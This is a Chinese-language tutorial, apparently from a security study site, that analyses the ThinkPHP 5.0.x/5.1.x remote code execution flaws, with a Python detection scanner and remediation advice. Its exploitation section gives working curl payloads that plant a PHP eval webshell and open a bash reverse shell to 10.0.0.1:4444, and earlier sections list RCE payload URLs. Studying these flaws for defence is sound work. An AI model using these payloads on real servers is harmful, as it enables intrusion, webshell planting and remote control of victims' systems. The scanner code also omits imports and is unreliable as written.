# ThinkPHP 5.x 远程代码执行漏洞完整分析

> 📅 2026-06-12 | 🎯 精通 | ⏱ 20 min | 分类：漏洞库与EXP

## 📋 提纲

1. ThinkPHP框架概述
2. 漏洞历史与高危CVE
3. ThinkPHP 5.0.x RCE 原理
4. ThinkPHP 5.1.x RCE 原理
5. 漏洞检测与利用
6. 护网中的ThinkPHP漏洞
7. 修复与加固

---

## 1. ThinkPHP 框架概述

ThinkPHP 是国内使用最广泛的PHP框架之一，大量政府/企业/教育网站基于它开发。

```
市场份额：PHP框架中排名前3
影响面：CMS、OA、电商、政府网站
版本：
  - ThinkPHP 3.x（已停止维护）
  - ThinkPHP 5.0.x / 5.1.x（常见漏洞版本）
  - ThinkPHP 5.2.x（修复版本）
  - ThinkPHP 6.x（最新版）
```

---

## 2. 高危CVE一览

| CVE/漏洞 | 版本 | 类型 | 原理 |
|---------|------|------|------|
| — | 5.0.x-5.0.23 | RCE | `method`参数任意函数调用 |
| — | 5.1.x-5.1.31 | RCE | 路由参数控制器过滤不严 |
| CVE-2018-20062 | 5.0.x-5.0.23 | RCE | `filter`参数代码执行 |
| CVE-2019-9082 | 5.1.x-5.1.31 | RCE | `__construct`覆盖导致文件包含 |
| CVE-2022-45982 | 5.1.x | RCE 链 | 路由dispatch绕过 |

**核心问题：ThinkPHP的URL路由解析过度"灵活"，允许用户输入调用任意类和方法。**

---

## 3. ThinkPHP 5.0.x RCE 原理

### 3.1 漏洞触发路径

```
URL: /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id

解析：
s=index/think\app/invokefunction
  ↓ ThinkPHP路由解析
controller = index
  ↓ 反斜杠解析
调用 think\app 类的 invokefunction 方法
  ↓
invokefunction(function: call_user_func_array, vars: [shell_exec, ['id']])
  ↓
call_user_func_array('shell_exec', ['id'])
  ↓
shell_exec('id')
  ↓
RCE！
```

### 3.2 核心漏洞代码

```php
// ThinkPHP 5.0.x - library/think/App.php
// URL路由处理中的漏洞

public static function run()
{
    // 解析URL中的 controller/action
    $dispatch = self::routeCheck($request);

    // 关键：dispatch 中包含用户可控的 controller 和 method
    if ($dispatch instanceof \think\route\Dispatch) {
        $data = self::exec($dispatch);
    }
}

protected static function exec($dispatch)
{
    // 用户输入变成了 controller 和 action
    // 但这里没有严格的白名单限制
    $data = self::invokeMethod($dispatch['type'], [
        $dispatch['controller'],
        $dispatch['action']
    ]);
}
```

---

## 4. ThinkPHP 5.1.x RCE 原理

### 4.1 路由参数过滤不严

```
URL: /index.php?s=/index/\think\Request/input&filter=system&data=whoami
或: /index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
或: /index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
```

### 4.2 文件包含链

```
1. 覆盖 \think\Config 的 __construct
2. 控制 cacheFile 路径
3. 写入恶意内容到文件
4. 通过文件包含执行
```

---

## 5. 漏洞检测

```python
#!/usr/bin/env python3
"""ThinkPHP RCE 检测"""

import requests
import urllib.parse
import urllib3
urllib3.disable_warnings()

class ThinkPHPDetector:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def detect_version(self):
        """检测ThinkPHP版本"""
        # 方法1：通过页面特征
        try:
            resp = requests.get(self.target, verify=False, timeout=10)

            # ThinkPHP 5.x 特征
            if 'thinkphp' in resp.text.lower() or 'ThinkPHP' in resp.text:
                # 尝试从错误页面提取版本
                return {"detected": True, "framework": "ThinkPHP"}
        except:
            pass

        # 方法2：特殊路径
        try:
            resp = requests.get(f"{self.target}/index.php?s=index/index/index", verify=False, timeout=5)
            if 'thinkphp' in resp.text.lower() or 'ThinkPHP' in resp.headers.get('X-Powered-By', ''):
                return {"detected": True, "framework": "ThinkPHP"}
        except:
            pass

        return {"detected": False}

    def detect_5_0_x_rce(self):
        """检测 ThinkPHP 5.0.x RCE"""
        # payload: 使用 echo 输出特征字符串
        check_str = "THINKPHP_RCE_CHECK_" + str(random.randint(10000, 99999))
        payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20{check_str}"

        try:
            resp = requests.get(
                f"{self.target}{payload}",
                verify=False,
                timeout=15
            )

            if check_str in resp.text:
                return {
                    "vulnerable": True,
                    "version": "5.0.x",
                    "method": "invokefunction",
                    "payload": payload,
                    "response": resp.text[:200]
                }
        except:
            pass

        return {"vulnerable": False}

    def detect_5_1_x_rce(self):
        """检测 ThinkPHP 5.1.x RCE"""
        check_str = "THINKPHP_RCE_CHECK_" + str(random.randint(10000, 99999))

        payloads = [
            f"/index.php?s=index/\\think\\Request/input&filter=system&data=echo%20{check_str}",
            f"/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20{check_str}",
            f"/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=<?php%20echo%20'{check_str}';?>&content=test",
        ]

        for payload in payloads:
            try:
                resp = requests.get(f"{self.target}{payload}", verify=False, timeout=15)
                if check_str in resp.text:
                    return {
                        "vulnerable": True,
                        "version": "5.1.x",
                        "method": payload.split('&')[0].split('=')[-1] if '=' in payload else '',
                        "payload": payload[:150]
                    }
            except:
                continue

        return {"vulnerable": False}

    def full_scan(self):
        version = self.detect_version()
        if not version['detected']:
            return {"result": "未检测到ThinkPHP"}

        return {
            "framework": "ThinkPHP",
            "v5_0_rce": self.detect_5_0_x_rce(),
            "v5_1_rce": self.detect_5_1_x_rce(),
        }


if __name__ == "__main__":
    detector = ThinkPHPDetector("https://target.com")
    result = detector.full_scan()
    print(json.dumps(result, indent=2, ensure_ascii=False))
```

---

## 6. 漏洞利用

### 6.1 写入WebShell

```bash
# ThinkPHP 5.0.x - 写入WebShell
# 写入一句话木马到 public/shell.php
curl -s "http://target.com/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval(\$_POST['cmd']);?>"

# 或写入完整WebShell
curl -s "http://target.com/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php eval(\$_POST[1]);?>' > shell.php"

# 验证
curl -s "http://target.com/shell.php" -d "1=phpinfo();"
```

### 6.2 反弹Shell

```bash
# ThinkPHP 5.0.x
curl -s "http://target.com/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"

# URL编码版本
curl -s "http://target.com/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.1/4444%200%3E%261%27"
```

---

## 7. 修复方案

```php
// 1. 升级框架版本
// ThinkPHP 5.0.x：升级到 5.0.24
// ThinkPHP 5.1.x：升级到 5.1.32+
// ThinkPHP 5.2.x：保持最新
// 建议直接升级到 ThinkPHP 6.x

// 2. 临时修复（app/config.php）
'template' => [
    'tpl_cache' => false,  // 关闭模板缓存
],

// 3. WAF规则
// Nginx
if ($args ~* "invokefunction|call_user_func_array|shell_exec|system") {
    return 403;
}

// 4. 代码层面修复
// 在 App::exec() 中增加白名单
protected static function exec($dispatch) {
    // 白名单：仅允许明确的 controller
    $allowed_controllers = [
        'app\index\controller\Index',
        'app\index\controller\Api',
    ];
    
    if (!in_array($dispatch['controller'], $allowed_controllers)) {
        throw new \Exception('Invalid controller');
    }
}
```

---

## ✅ ThinkPHP Checklist

- [ ] 全网ThinkPHP应用识别
- [ ] 版本号确认
- [ ] RCE检测（5.0.x + 5.1.x两种）
- [ ] 升级到6.x或最新安全版本
- [ ] WAF规则部署
- [ ] 所有Web目录检查是否存在未知WebShell

> 📚 延伸阅读：Vuln/001-漏洞概述 | CodeAudit/001-PHP代码审计 | HW/002-资产自查

---

## 高分考点与知识巧记

### 高分考点速查表

| 考点 | 考察维度 | 记忆要点 |
|------|----------|----------|
| ThinkPHP 5 RCE原理 | 核心机制 | 未过滤的控制器/方法名→Request类method方法覆盖→call_user_func_array执行 |
| 受影响版本 | 版本识别 | ThinkPHP 5.0.x(5.0.23以下)、5.1.x(5.1.31以下)；5.2.x不受影响 |
| 漏洞利用Payload | 实战技巧 | ?s=captcha→_method=__construct→filter[]=system→POST传参执行命令 |
| ThinkPHP架构特点 | 基础知识 | MVC框架、单一入口(index.php)、路由解析、自动加载机制 |
| 检测与修复 | 防护策略 | 升级至安全版本、WAF规则防护、禁用危险函数(exec/system等) |
| 中国CMS漏洞特点 | 国内安全 | 国产CMS漏洞频发(ThinkPHP/Shiro/Fastjson/Spring)；护网高频利用 |

### 知识巧记口诀

> **ThinkPHP RCE口诀**：
> ThinkPHP 5.x版本，captcha路由是入口；
> _method覆盖构造，filter数组传命令；
> 5.0.23以下全中招，5.1.31也要补；
> 国产框架漏洞多，资产自查第一条。

> **国内框架漏洞链**：ThinkPHP RCE→Shiro反序列化→Fastjson JNDI→Spring4Shell。

### 考试陷阱提醒

| 陷阱 | 正确认知 |
|------|----------|
| ❌ ThinkPHP 6.x也受影响 | ✅ 该漏洞仅影响ThinkPHP 5.0.x和5.1.x特定版本，6.x架构重构不受影响 |
| ❌ 只改控制器名就能防 | ✅ 需要从根本上修复Request类的method覆盖问题，仅过滤参数不够 |
| ❌ ThinkPHP是国外框架 | ✅ ThinkPHP是国产PHP框架，在中国企业中使用广泛，护网中频繁被利用 |

> 💡 **一句话总结**：ThinkPHP RCE是国产框架漏洞的典型代表——MVC框架的自动解析机制可能引入严重安全风险，CISP考试考查国产框架安全和中国企业资产防护。
